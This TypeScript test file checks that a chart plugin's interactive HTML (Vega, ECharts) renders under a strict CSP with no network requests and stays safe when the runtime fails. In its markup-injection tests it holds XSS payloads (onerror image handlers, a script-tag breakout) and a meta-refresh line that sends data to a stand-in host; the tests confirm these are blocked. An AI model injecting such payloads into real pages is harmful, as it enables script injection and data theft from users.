/// <reference lib="dom" />
/// <reference lib="dom.iterable" />
// Interactive HTML in a real browser, under its own CSP and with the network refused: the runtime starts, nothing
// is evaluated from a string, nothing is fetched, and each advertised interaction changes what is drawn.
import { afterAll, beforeAll, describe, expect, test } from "bun:test"
import { readFileSync, writeFileSync } from "node:fs"
import { join } from "node:path"
import { HTML_INTERACTIONS } from "../../src/runtime-support.ts"
import { contentSecurityPolicy } from "../../src/html.ts"
import { catalogueCall, closeBrowser, launch, open, renderHtml, resign, startPlugin, workDir, type Plugin } from "./harness.ts"

let plugin: Plugin
beforeAll(async () => { await launch(); plugin = await startPlugin() })
afterAll(async () => { await closeBrowser(); await plugin?.close() })

const GRID = "#E8EAED" // the light theme's grid colour: interactive_brush paints unselected points with it
const T = 60_000

/** The points the brush example draws: centre, fill, and whether it is unselected (painted in the grid colour). */
type Point = { x: number; y: number; fill: string }
const points = (page: import("playwright-core").Page) => page.evaluate(() => [...document.querySelectorAll("#chart .role-mark.marks path")].map(p => { const r = p.getBoundingClientRect(); return { x: r.x + r.width / 2, y: r.y + r.height / 2, fill: (p.getAttribute("fill") ?? "").toUpperCase() } }))

describe("Vega under the packaged CSP", () => {
  test("the harness sees a refused string evaluation (so zero violations elsewhere means something)", async () => {
    const dir = workDir()
    const file = join(dir, "eval.html")
    const script = `try{Function("return 1")()}catch(e){}`
    writeFileSync(file, `<!doctype html><meta http-equiv="Content-Security-Policy" content="${contentSecurityPolicy([script])}"><script>${script}</script>`)
    const page = await open(file, { wait: false })
    await page.page.waitForTimeout(100)
    expect(page.violations.some(v => v.startsWith("script-src") && v.endsWith("eval"))).toBe(true)
    await page.close()
  }, T)

  test("the default Function-based evaluator is refused by this CSP; the page keeps its static chart and says it failed", async () => {
    const { html } = await renderHtml(plugin, { ...(await catalogueCall(plugin, "interactive_brush")), name: "brush-codegen" })
    const text = readFileSync(html, "utf8")
    // The same page, but parsed without ASTs and run with Vega's default code generator.
    const codegen = text.replace("vega.parse(spec,null,{ast:true}),{expr:vegaInterpreter,", "vega.parse(spec),{")
    expect(codegen).not.toBe(text)
    writeFileSync(html, resign(codegen))
    const page = await open(html)
    expect(await page.status()).toBe("failed")
    expect(page.violations.some(v => v.startsWith("script-src") && v.endsWith("eval"))).toBe(true)
    const shell = await page.page.evaluate(() => ({ staticSvg: !!document.querySelector("#chart > svg"), failure: !document.getElementById("chart-failure")!.hidden, diagnostic: JSON.parse(document.getElementById("chart-diagnostic")!.textContent!) }))
    expect(shell.staticSvg).toBe(true)
    expect(shell.failure).toBe(true)
    expect(shell.diagnostic).toMatchObject({ code: "HTML_RUNTIME_FAILED", engine: "vega" })
    await page.close()
  }, T)

  test("vega-lite-interval-selection: interactive_brush starts with no CSP violation or request, and dragging selects exactly the points inside", async () => {
    const call = await catalogueCall(plugin, "interactive_brush")
    const { html, result } = await renderHtml(plugin, { ...call, name: "interactive-brush" })
    expect((result.output.files as { html: string }).html).toEndWith(".html")
    // A generated file has not run anywhere, so it says initializing until a browser starts it.
    expect(readFileSync(html, "utf8")).toContain('<html lang="en" data-chart-status="initializing">')
    const page = await open(html)
    expect(await page.status()).toBe("ready")
    expect(page.violations).toEqual([])
    expect(page.errors).toEqual([])
    expect(page.requests).toEqual([])
    // The live chart replaced the static one, and the off-screen stage is gone.
    expect(await page.page.evaluate(() => ({ live: !!document.querySelector("#chart > div > svg"), staticGone: !document.querySelector("#chart > svg"), stage: document.querySelectorAll('body > div[aria-hidden="true"]').length }))).toEqual({ live: true, staticGone: true, stage: 0 })

    const before = await points(page.page)
    expect(before.length).toBeGreaterThan(20)
    expect(before.filter(p => p.fill === GRID)).toEqual([]) // an empty brush selects everything

    const xs = before.map(p => p.x), ys = before.map(p => p.y)
    const [x0, x1, y0, y1] = [Math.min(...xs), Math.max(...xs), Math.min(...ys), Math.max(...ys)]
    const from = { x: x0 + (x1 - x0) * 0.15, y: y0 + (y1 - y0) * 0.15 }, to = { x: x0 + (x1 - x0) * 0.65, y: y0 + (y1 - y0) * 0.7 }
    await page.page.mouse.move(from.x, from.y)
    await page.page.mouse.down()
    await page.page.mouse.move(to.x, to.y, { steps: 8 })
    await page.page.mouse.up()

    const brush = await page.page.evaluate(() => { const r = document.querySelector("#chart .brush_brush path")!.getBoundingClientRect(); return { x0: r.left, x1: r.right, y0: r.top, y1: r.bottom } })
    expect(brush.x1 - brush.x0).toBeGreaterThan(20)
    const after = await points(page.page)
    expect(after.length).toBe(before.length) // selection changes emphasis, not the data
    const inside = (p: Point) => p.x > brush.x0 && p.x < brush.x1 && p.y > brush.y0 && p.y < brush.y1
    const nearEdge = (p: Point) => [p.x - brush.x0, brush.x1 - p.x, p.y - brush.y0, brush.y1 - p.y].some(d => Math.abs(d) < 1.5)
    const selected = after.filter(p => p.fill !== GRID), unselected = after.filter(p => p.fill === GRID)
    expect(selected.length).toBeGreaterThan(0)
    expect(unselected.length).toBeGreaterThan(0)
    for (const p of after.filter(p => !nearEdge(p))) expect(p.fill !== GRID).toBe(inside(p))

    // Double-click clears an interval selection: every point is selected again.
    await page.page.mouse.dblclick(x0 + (x1 - x0) * 0.9, y0 + (y1 - y0) * 0.9)
    expect((await points(page.page)).filter(p => p.fill === GRID)).toEqual([])
    expect(page.violations).toEqual([])
    expect(page.requests).toEqual([])
    await page.close()
  }, T)

  test("vega-lite-tooltip: hovering a bar shows its values", async () => {
    const { html } = await renderHtml(plugin, { spec: { mark: { type: "bar", tooltip: true }, encoding: { x: { field: "region", type: "nominal" }, y: { field: "revenue", type: "quantitative", title: "Revenue (€k)" } } }, data: { rows: [{ region: "North", revenue: 120 }, { region: "South", revenue: 80 }] }, title: "Tooltip", name: "vl-tooltip" })
    const page = await open(html)
    expect(await page.status()).toBe("ready")
    const bar = await page.page.evaluate(() => { const r = document.querySelector("#chart .role-mark path")!.getBoundingClientRect(); return { x: r.x + r.width / 2, y: r.y + r.height / 2 } })
    await page.page.mouse.move(bar.x, bar.y)
    await page.page.waitForSelector("#vg-tooltip-element.visible", { timeout: 5_000 })
    const text = await page.page.textContent("#vg-tooltip-element")
    expect(text).toContain("North")
    expect(text).toContain("120")
    expect(page.violations).toEqual([])
    await page.close()
  }, T)

  test("vega-signals: a signal set by a click event re-encodes the clicked mark", async () => {
    const spec = {
      $schema: "https://vega.github.io/schema/vega/v6.json", width: 240, height: 120,
      signals: [{ name: "picked", value: null, on: [{ events: "rect:click", update: "datum.k" }] }],
      data: [{ name: "table", values: [{ k: "a", v: 3 }, { k: "b", v: 5 }] }],
      scales: [{ name: "x", type: "band", domain: { data: "table", field: "k" }, range: "width", padding: 0.1 }, { name: "y", domain: { data: "table", field: "v" }, range: "height", nice: true, zero: true }],
      axes: [{ orient: "bottom", scale: "x", title: "Key" }, { orient: "left", scale: "y", title: "Value" }],
      marks: [{ type: "rect", from: { data: "table" }, encode: { enter: { x: { scale: "x", field: "k" }, width: { scale: "x", band: 1 }, y: { scale: "y", field: "v" }, y2: { scale: "y", value: 0 } }, update: { fill: { signal: "picked === datum.k ? '#CC0000' : '#4477AA'" } } } }],
    }
    const { html } = await renderHtml(plugin, { spec, title: "Signals", name: "vega-signals" })
    const page = await open(html)
    expect(await page.status()).toBe("ready")
    const fills = () => page.page.evaluate(() => [...document.querySelectorAll("#chart .role-mark path")].map(p => (p.getAttribute("fill") ?? "").toUpperCase()))
    expect(await fills()).toEqual(["#4477AA", "#4477AA"])
    const second = await page.page.evaluate(() => { const r = document.querySelectorAll("#chart .role-mark path")[1]!.getBoundingClientRect(); return { x: r.x + r.width / 2, y: r.y + r.height / 2 } })
    await page.page.mouse.click(second.x, second.y)
    expect(await fills()).toEqual(["#4477AA", "#CC0000"])
    expect(page.violations).toEqual([])
    expect(page.errors).toEqual([])
    await page.close()
  }, T)
})

describe("ECharts", () => {
  const option = { legend: { data: ["2024", "2025"] }, xAxis: { type: "category", data: ["Q1", "Q2", "Q3"] }, yAxis: { type: "value", name: "Orders" }, series: [{ name: "2024", type: "bar", data: [120, 80, 95] }, { name: "2025", type: "bar", data: [130, 90, 70] }] }
  const bars = (page: import("playwright-core").Page, colour: string) => page.evaluate((c) => [...document.querySelectorAll("#chart path")].filter(p => (p.getAttribute("fill") ?? "").toUpperCase() === c).length, colour)

  test("echarts-tooltip: hovering a bar shows the axis tooltip with both series' values", async () => {
    const { html } = await renderHtml(plugin, { spec: option, title: "Orders by quarter", name: "echarts-tooltip" })
    const page = await open(html)
    expect(await page.status()).toBe("ready")
    expect(page.violations).toEqual([])
    expect(page.requests).toEqual([])
    const target = await page.page.evaluate(() => { const p = [...document.querySelectorAll("#chart path")].find(e => (e.getAttribute("fill") ?? "").toUpperCase() === "#4477AA" && e.getBoundingClientRect().height > 30)!; const r = p.getBoundingClientRect(); return { x: r.x + r.width / 2, y: r.y + r.height / 2 } })
    await page.page.mouse.move(target.x, target.y, { steps: 4 })
    await page.page.waitForFunction(() => [...document.querySelectorAll("#chart div")].some(d => /Q1/.test(d.textContent ?? "") && /120/.test(d.textContent ?? "") && getComputedStyle(d).display !== "none" && getComputedStyle(d).opacity !== "0"), undefined, { timeout: 5_000 })
    const tip = await page.page.evaluate(() => [...document.querySelectorAll("#chart div")].map(d => d.textContent ?? "").find(t => /Q1/.test(t) && /120/.test(t)))
    expect(tip).toContain("130")
    expect(page.violations).toEqual([])
    await page.close()
  }, T)

  test("echarts-legend-toggle: clicking a legend entry hides that series and clicking again shows it", async () => {
    const { html } = await renderHtml(plugin, { spec: option, title: "Orders by quarter", name: "echarts-legend" })
    const page = await open(html)
    expect(await page.status()).toBe("ready")
    // The bars, by shape: filled paths taller and wider than a legend icon (hover emphasis can change their colour).
    const drawn = () => page.page.evaluate(() => [...document.querySelectorAll("#chart path")].filter(p => { const f = p.getAttribute("fill"); const r = p.getBoundingClientRect(); return f && f !== "none" && !/^rgb\(0,\s*0,\s*0\)$/.test(f) && r.height > 20 && r.width > 10 }).length)
    expect(await drawn()).toBe(6)
    expect(await bars(page.page, "#EE6677")).toBe(4) // the 2025 series' three bars and its legend icon
    const entry = await page.page.evaluate(() => { const t = [...document.querySelectorAll("#chart text")].find(e => e.textContent === "2025")!; const r = t.getBoundingClientRect(); return { x: r.x + r.width / 2, y: r.y + r.height / 2 } })
    await page.page.mouse.click(entry.x, entry.y)
    await page.page.waitForFunction(() => [...document.querySelectorAll("#chart path")].every(p => (p.getAttribute("fill") ?? "").toUpperCase() !== "#EE6677"), undefined, { timeout: 5_000 })
    expect(await drawn()).toBe(3)
    await page.page.mouse.click(entry.x, entry.y)
    await page.page.waitForFunction(() => [...document.querySelectorAll("#chart path")].filter(p => { const f = p.getAttribute("fill"); const r = p.getBoundingClientRect(); return f && f !== "none" && !/^rgb\(0,\s*0,\s*0\)$/.test(f) && r.height > 20 && r.width > 10 }).length === 6, undefined, { timeout: 5_000 })
    expect(page.violations).toEqual([])
    expect(page.errors).toEqual([])
    await page.close()
  }, T)
})

describe("ECharts tooltip markup", () => {
  const PAYLOAD = `<img src=x onerror="window.__pwned=1">{b}`
  const REFRESH = `<meta http-equiv="refresh" content="0;url=https://example.invalid/?d={b}">{b}`
  const BASE = { tooltip: { trigger: "item" }, legend: { data: ["2024"] }, xAxis: { type: "category", data: ["Q1", "Q2"] }, yAxis: { type: "value" }, series: [{ name: "2024", type: "bar", data: [120, 80] }] }
  type Option = { tooltip: Record<string, unknown>; legend: Record<string, unknown>; series: { tooltip?: unknown; data: unknown[] }[] }
  const LEVELS: [string, (o: Option) => void, "bar" | "legend"][] = [
    ["/tooltip/formatter", o => { o.tooltip.formatter = PAYLOAD }, "bar"],
    ["/series/0/tooltip/formatter", o => { o.series[0]!.tooltip = { formatter: PAYLOAD } }, "bar"],
    ["/series/0/data/0/tooltip/formatter", o => { o.series[0]!.data[0] = { value: 120, tooltip: { formatter: PAYLOAD } } }, "bar"],
    ["/legend/tooltip/formatter", o => { o.legend.tooltip = { show: true, formatter: PAYLOAD } }, "legend"],
  ]
  const hoverTarget = (page: import("playwright-core").Page, target: "bar" | "legend") => page.evaluate((t) => {
    const el = t === "legend" ? [...document.querySelectorAll("#chart text")].find(e => e.textContent === "2024")! : [...document.querySelectorAll("#chart path")].find(e => (e.getAttribute("fill") ?? "").toUpperCase() === "#4477AA" && e.getBoundingClientRect().height > 30)!
    const r = el.getBoundingClientRect(); return { x: r.x + r.width / 2, y: r.y + r.height / 2 }
  }, target)

  // Validation refuses these. Here both earlier layers are bypassed, to test the CSP alone: the option JSON is edited
  // (the spec check), and the boot's own markup check is switched off with the page re-signed through the same policy
  // function. The markup reaches the tooltip, and its handler is refused.
  for (const [level, inject, target] of LEVELS) test(`${level}: validation refuses the payload, and the CSP refuses its handler when the markup is forced into the page`, async () => {
    const authored = structuredClone(BASE) as unknown as Option
    inject(authored)
    const checked = await plugin.call("validate", { spec: authored, inspect: false })
    expect(checked.output.valid).toBe(false)
    expect((checked.output.issues as { code: string; path: string }[]).map(i => `${i.code} ${i.path}`)).toContain(`ECHARTS_MARKUP_REFUSED ${level}`)
    await expect(plugin.call("render", { spec: authored, formats: ["html"], name: "refused" })).rejects.toThrow(/ECHARTS_MARKUP_REFUSED/)
    const { html } = await renderHtml(plugin, { spec: BASE, title: "Tooltip markup", name: `markup-${level.replace(/\W+/g, "-")}` })
    const text = readFileSync(html, "utf8")
    const match = /<script type="application\/json" id="chart-spec">([\s\S]*?)<\/script>/.exec(text)!
    const option = JSON.parse(match[1]!) as Option
    inject(option)
    const unchecked = text.replace(match[1]!, JSON.stringify(option).replace(/</g, "\\u003c")).replace("var refused=chartsTooltipMarkup(option);", "var refused=[];")
    expect(unchecked).toContain("var refused=[];")
    writeFileSync(html, resign(unchecked))
    const page = await open(html)
    expect(await page.status()).toBe("ready")
    const at = await hoverTarget(page.page, target)
    await page.page.mouse.move(at.x, at.y, { steps: 4 })
    await page.page.waitForFunction(() => !!document.querySelector("#chart div img"), undefined, { timeout: 5_000 })
    await page.page.waitForTimeout(300)
    expect(await page.page.evaluate(() => (window as unknown as { __pwned?: number }).__pwned ?? null)).toBeNull()
    expect(page.violations.some(v => v.startsWith("script-src-attr"))).toBe(true)
    // The injected image's request is refused too (img-src allows data: and blob: only, and the harness aborts it).
    expect(page.violations.some(v => v.startsWith("img-src"))).toBe(true)
    await page.close()
  }, T)

  // Markup a CSP cannot stop: a meta refresh navigates away with data. The page runs the spec check's own markup check
  // (bundled, so covered by the CSP hash) before ECharts starts, so the forced payload never reaches the DOM.
  for (const [level, inject] of [
    ["/tooltip/formatter", (o: Option) => { o.tooltip.formatter = REFRESH }],
    ["/series/0/data/0/tooltip/formatter", (o: Option) => { o.series[0]!.data[0] = { value: 120, tooltip: { formatter: REFRESH } } }],
  ] as const) test(`${level}: a forced meta refresh is refused by the page itself, which keeps the static chart and never navigates`, async () => {
    const { html } = await renderHtml(plugin, { spec: BASE, title: "Refresh", name: `refresh-${level.replace(/\W+/g, "-")}` })
    const text = readFileSync(html, "utf8")
    const match = /<script type="application\/json" id="chart-spec">([\s\S]*?)<\/script>/.exec(text)!
    const option = JSON.parse(match[1]!) as Option
    inject(option)
    writeFileSync(html, text.replace(match[1]!, JSON.stringify(option).replace(/</g, "\\u003c")))
    const page = await open(html)
    const navigations: string[] = []
    page.page.on("framenavigated", frame => navigations.push(frame.url()))
    expect(await page.status()).toBe("failed")
    const shell = await page.page.evaluate(() => ({ staticSvg: !!document.querySelector("#chart > svg"), live: document.querySelectorAll("#chart > div").length, meta: document.querySelectorAll("body meta").length, diagnostic: JSON.parse(document.getElementById("chart-diagnostic")!.textContent!), notice: !document.getElementById("chart-failure")!.hidden }))
    expect(shell).toMatchObject({ staticSvg: true, live: 0, meta: 0, notice: true, diagnostic: { code: "HTML_RUNTIME_FAILED", engine: "echarts", stage: "init" } })
    expect(shell.diagnostic.message).toContain(`Refused tooltip markup at ${level}`)
    const at = await hoverTarget(page.page, "bar")
    await page.page.mouse.move(at.x, at.y, { steps: 4 })
    await page.page.waitForTimeout(1_200)
    expect(navigations).toEqual([])
    expect(page.page.url()).toBe(page.url)
    expect(page.requests).toEqual([])
    expect(page.violations).toEqual([])
    await page.close()
  }, T)

  test("a {b}<br/>{c} formatter still draws a two-line tooltip, and default tooltips show names as text", async () => {
    const { html } = await renderHtml(plugin, { spec: { ...BASE, tooltip: { trigger: "item", formatter: "{b}<br/>{c}" } }, title: "Two lines", name: "two-lines" })
    const page = await open(html)
    expect(await page.status()).toBe("ready")
    const at = await hoverTarget(page.page, "bar")
    await page.page.mouse.move(at.x, at.y, { steps: 4 })
    await page.page.waitForFunction(() => [...document.querySelectorAll("#chart div")].some(d => d.querySelector(":scope > br") && /Q1/.test(d.textContent ?? "")), undefined, { timeout: 5_000 })
    const lines = await page.page.evaluate(() => { const d = [...document.querySelectorAll("#chart div")].find(e => e.querySelector(":scope > br") && /Q1/.test(e.textContent ?? ""))! as HTMLElement; return d.innerText.split("\n").map(l => l.trim()).filter(Boolean) })
    expect(lines.slice(0, 2)).toEqual(["Q1", "120"])
    expect(page.violations).toEqual([])
    await page.close()

    const NAME = `<img src=y onerror="window.__pwned=2">`
    const named = await renderHtml(plugin, { spec: { ...BASE, xAxis: { type: "category", data: [NAME, "Q2"] } }, title: "Names", name: "tooltip-names" })
    const second = await open(named.html)
    const bar = await hoverTarget(second.page, "bar")
    await second.page.mouse.move(bar.x, bar.y, { steps: 4 })
    await second.page.waitForFunction((n) => [...document.querySelectorAll("#chart div")].some(d => (d.textContent ?? "").includes(n)), NAME, { timeout: 5_000 })
    expect(await second.page.evaluate(() => document.querySelectorAll("#chart div img").length)).toBe(0)
    expect(second.violations).toEqual([])
    await second.close()
  }, T)
})

describe("failure keeps the static chart (A26)", () => {
  const breakRuntime = (text: string) => {
    const broken = text.replace(/<script>(?!\(function\(\)\{var ENGINE)[\s\S]*?<\/script>/, "<script>/* the runtime is missing */</script>")
    expect(broken).not.toBe(text)
    return broken
  }
  const shellOf = (page: import("playwright-core").Page) => page.evaluate(() => {
    const failure = document.getElementById("chart-failure")!
    const diagnostic = document.getElementById("chart-diagnostic")!.textContent ?? ""
    return { failureShown: !failure.hidden && failure.getBoundingClientRect().height > 0, diagnostic, statusText: document.getElementById("chart-status")!.textContent, staticSvg: document.querySelector("#chart > svg")?.outerHTML.length ?? 0, title: document.querySelector("#chart > svg title")?.textContent, stage: document.querySelectorAll('body > div[aria-hidden="true"]').length, live: document.querySelectorAll("#chart > div").length }
  })

  for (const [engine, input] of [
    ["vega", { spec: { mark: "bar", encoding: { x: { field: "k", type: "nominal" }, y: { field: "v", type: "quantitative", title: "V (n)" } } }, data: { rows: [{ k: "a", v: 1 }, { k: "b", v: 2 }] }, title: "Broken Vega runtime" }],
    ["echarts", { spec: { xAxis: { type: "category", data: ["a", "b"] }, yAxis: { type: "value" }, series: [{ type: "bar", data: [1, 2] }] }, title: "Broken ECharts runtime" }],
  ] as const) test(`a missing ${engine} runtime (a synchronous failure) leaves the static chart, a visible notice and a bounded diagnostic`, async () => {
    const { html } = await renderHtml(plugin, { ...input, name: `broken-${engine}` })
    writeFileSync(html, resign(breakRuntime(readFileSync(html, "utf8"))))
    const page = await open(html)
    expect(await page.status()).toBe("failed")
    const shell = await shellOf(page.page)
    expect(shell).toMatchObject({ failureShown: true, title: input.title, stage: 0, live: 0 })
    expect(shell.staticSvg).toBeGreaterThan(500)
    expect(shell.statusText).toContain("did not start")
    const diagnostic = JSON.parse(shell.diagnostic)
    expect(diagnostic).toEqual({ code: "HTML_RUNTIME_FAILED", engine, stage: "init", message: expect.stringContaining("not available") })
    expect(diagnostic.message.length).toBeLessThanOrEqual(240)
    expect(page.requests).toEqual([])
    await page.page.waitForTimeout(300)
    expect(await page.status()).toBe("failed") // never flips to ready afterwards
    await page.close()
  }, T)

  test("an asynchronous Vega dataflow failure leaves the static chart and reports failed, never ready", async () => {
    const { html } = await renderHtml(plugin, { spec: { mark: "bar", encoding: { x: { field: "k", type: "nominal" }, y: { field: "v", type: "quantitative", title: "V (n)" } } }, data: { rows: [{ k: "a", v: 1 }, { k: "b", v: 2 }] }, title: "Async failure", name: "async-failure" })
    const text = readFileSync(html, "utf8")
    const match = /<script type="application\/json" id="chart-spec">([\s\S]*?)<\/script>/.exec(text)!
    const spec = JSON.parse(match[1]!) as { data: { values?: unknown[]; transform?: unknown[] }[] }
    const table = spec.data.find(d => Array.isArray(d.values))!
    // Evaluated while the dataflow runs, after parsing succeeded: `datum.missing` is undefined, so `.deeper` throws.
    table.transform = [...(table.transform ?? []), { type: "formula", expr: "datum.missing.deeper", as: "boom" }]
    writeFileSync(html, text.replace(match[1]!, JSON.stringify(spec).replace(/</g, "\\u003c")))
    const page = await open(html)
    expect(await page.status()).toBe("failed")
    const shell = await shellOf(page.page)
    expect(shell).toMatchObject({ failureShown: true, title: "Async failure", stage: 0, live: 0 })
    expect(JSON.parse(shell.diagnostic)).toMatchObject({ code: "HTML_RUNTIME_FAILED", engine: "vega" })
    expect(page.violations).toEqual([])
    await page.close()
  }, T)
})

describe("text and data are shown as text (A28)", () => {
  const TITLE = `</script><script>window.__pwned=1</script><img src=x onerror="window.__pwned=2">"&'<!--`
  const LABELS = ["</script><b>b</b>", "<img src=y onerror=f()>", "plain"]
  for (const [engine, input] of [
    ["vega-lite", { spec: { mark: { type: "bar", tooltip: true }, encoding: { x: { field: "k", type: "nominal", title: "Key" }, y: { field: "v", type: "quantitative", title: "V (n)" } } }, data: { rows: LABELS.map((k, i) => ({ k, v: i + 1 })) } }],
    ["echarts", { spec: { xAxis: { type: "category", data: LABELS, axisLabel: { interval: 0 } }, yAxis: { type: "value" }, series: [{ type: "bar", data: [1, 2, 3] }] } }],
  ] as const) test(`${engine}: a title and labels with </script> and markup run nothing and load nothing`, async () => {
    const { html } = await renderHtml(plugin, { ...input, title: TITLE, description: `${TITLE} description`, name: `markup-${engine}` })
    const text = readFileSync(html, "utf8")
    expect(text.match(/<script/g)!.length).toBe(engine === "echarts" ? 4 : 3)
    const page = await open(html)
    expect(await page.status()).toBe("ready")
    const seen = await page.page.evaluate(() => ({
      pwned: (window as unknown as { __pwned?: number }).__pwned ?? null,
      title: document.title,
      scripts: document.scripts.length,
      injected: document.querySelectorAll("img, b").length,
      labels: [...document.querySelectorAll("#chart text")].map(t => t.textContent),
    }))
    expect(seen.pwned).toBeNull()
    expect(seen.title).toBe(TITLE)
    expect(seen.injected).toBe(0)
    for (const label of LABELS) expect(seen.labels).toContain(label)
    expect(page.violations).toEqual([])
    expect(page.requests).toEqual([])
    await page.close()
  }, T)
})

describe("every catalogue example", () => {
  test("starts in the browser from its catalogue call, with no CSP violation, console error or request", async () => {
    const list = (await plugin.call("catalogue", {})).output.types as { id: string; engine: string }[]
    expect(list.length).toBeGreaterThan(40)
    const problems: string[] = []
    for (const { id } of list) {
      const { html } = await renderHtml(plugin, { ...(await catalogueCall(plugin, id)), name: `catalogue-${id}` })
      const page = await open(html)
      const status = await page.status()
      if (status !== "ready") problems.push(`${id}: ${status} ${await page.page.textContent("#chart-diagnostic")}`)
      if (page.violations.length) problems.push(`${id}: CSP ${page.violations.join(", ")}`)
      if (page.errors.length) problems.push(`${id}: ${page.errors.join(" | ").slice(0, 300)}`)
      if (page.requests.length) problems.push(`${id}: requested ${page.requests.join(", ")}`)
      await page.close()
    }
    expect(problems).toEqual([])
  }, 240_000)
})

test("every advertised HTML interaction has a browser test of that title", () => {
  const titles = [...readFileSync(join(import.meta.dir, "runtime.test.ts"), "utf8").matchAll(/test\(`?"?([a-z-]+):/g)].map(m => m[1])
  for (const interaction of HTML_INTERACTIONS) expect(titles).toContain(interaction.id)
})
